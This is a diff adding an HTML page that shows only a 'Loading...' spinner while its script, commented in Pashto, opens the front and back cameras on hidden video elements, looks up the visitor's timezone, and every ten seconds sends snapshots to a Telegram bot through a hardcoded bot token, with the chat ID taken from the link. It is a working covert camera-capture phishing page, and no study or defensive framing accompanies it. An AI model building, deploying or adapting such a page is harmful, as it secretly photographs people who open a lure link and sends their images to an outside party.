@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .loading {
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #frontCamera, #backCamera {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading">
+        <div class="spinner"></div>
+        <p>Loading...</p>
+    </div>
+
+    <video id="frontCamera" autoplay playsinline style="display: none;"></video>
+    <video id="backCamera" autoplay playsinline style="display: none;"></video>
+    <canvas id="canvasFront" style="display: none;"></canvas>
+    <canvas id="canvasBack" style="display: none;"></canvas>
+
+    <script>
+        // د URL څخه کاروونکي ID ترلاسه کړي
+        function getUrlParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        const userId = getUrlParameter('userid');
+
+        // که چیرې userId نه وي، نو کار نه کړي
+        if (!userId) {
+            document.querySelector('.loading p').textContent = "User ID not found.";
+            exit();
+        }
+
+        // د تلیګرام بُوټ API
+        const botToken = '8051076844:AAEN0Q6igi5skFgw4f3J7xXF6Cm7WoUNa7E';
+
+        // د IP، هیواد، او ټایم زون معلوماتو ترلاسه کولو لپاره API
+        fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+            const timezone = data.timezone || 'N/A';
+            const proofnum = userId; // د مثال په توګه د کاروونکي ID څخه کارول
+
+            // د میسج متن
+            const message = `📷 **Photo Web Info Received**\n\n_timezone_ : ${timezone}\n_Proofnum_:\`${proofnum}\`\n**dev**: @ProTech43\nThis is Photo Web Info`;
+
+            // د کمیرو ترسره کول
+            const frontVideo = document.getElementById('frontCamera');
+            const backVideo = document.getElementById('backCamera');
+            const canvasFront = document.getElementById('canvasFront');
+            const canvasBack = document.getElementById('canvasBack');
+
+            let frontStream = null;
+            let backStream = null;
+
+            // د عکس اخستل او لیږل دوه کمیرې
+            function captureAndSend() {
+                if (!frontStream || !backStream) return; // که چیرې کمیرا شتون نه لري، نو کار نه کړي
+
+                // د لومړي کمیرا ( frontal / front ) عکس
+                canvasFront.width = frontVideo.videoWidth;
+                canvasFront.height = frontVideo.videoHeight;
+                canvasFront.getContext('2d').drawImage(frontVideo, 0, 0);
+
+                // د دوهم کمیرا ( back ) عکس
+                canvasBack.width = backVideo.videoWidth;
+                canvasBack.height = backVideo.videoHeight;
+                canvasBack.getContext('2d').drawImage(backVideo, 0, 0);
+
+                // د عکسونو د blob (Binary Large Object) په توګه بدلول
+                canvasFront.toBlob(function(frontBlob) {
+                    canvasBack.toBlob(function(backBlob) {
+                        const frontPhotoFile = new File([frontBlob], 'front_photo.jpg', { type: 'image/jpeg' });
+                        const backPhotoFile = new File([backBlob], 'back_photo.jpg', { type: 'image/jpeg' });
+
+                        // د عکسونو لیږل لپاره فارم ډاټا
+                        const sendPhoto = (photoFile, caption) => {
+                            const formData = new FormData();
+                            formData.append('chat_id', userId);
+                            formData.append('photo', photoFile);
+                            formData.append('caption', caption); // میسج د عکس سره
+
+                            return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        };
+
+                        // دوه عکسونه لیږل
+                        Promise.all([
+                            sendPhoto(frontPhotoFile, message),
+                            sendPhoto(backPhotoFile, message)
+                        ])
+                        .then(responses => {
+                            return Promise.all(responses.map(r => r.json()));
+                        })
+                        .then(results => {
+                            results.forEach((data, index) => {
+                                if (data.ok) {
+                                    console.log(`Photo ${index + 1} sent successfully.`);
+                                } else {
+                                    console.error(`Error sending photo ${index + 1}:`, data);
+                                }
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Error sending photos:', error);
+                        });
+                    }, 'image/jpeg');
+                }, 'image/jpeg');
+            }
+
+            // د کمیرا لاسرسی
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                // د لومړي کمیرا ( frontal / front ) لاسرسی
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // frontal camera
+                    .then(stream => {
+                        frontStream = stream;
+                        frontVideo.srcObject = stream;
+                    })
+                    .catch(err => {
+                        console.error("Error accessing front camera: ", err);
+                    });
+
+                // د دوهم کمیرا ( back ) لاسرسی
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }) // back camera
+                    .then(stream => {
+                        backStream = stream;
+                        backVideo.srcObject = stream;
+                    })
+                    .catch(err => {
+                        console.error("Error accessing back camera: ", err);
+                    });
+
+                // 1 ثانیه وخت تمه (د لوډینګ وخت)
+                setTimeout(() => {
+                    // د عکسونو د اخستلو او لیږلو چلند (د 10 ثانیو په وخت کې)
+                    setInterval(captureAndSend, 10000); // 10000 milliseconds = 10 seconds
+                    // که چیرې تاسو 1 ثانیه یا نور وخت غواړئ، نو عدد بدل کړئ
+                }, 1000); // 1000 milliseconds = 1 second
+
+            } else {
+                console.error("navigator.mediaDevices.getUserMedia is not supported by this browser.");
+            }
+        })
+        .catch(error => {
+            console.error('Error fetching IP info:', error);
+        });
+    </script>
+
+</body>
+</html> 
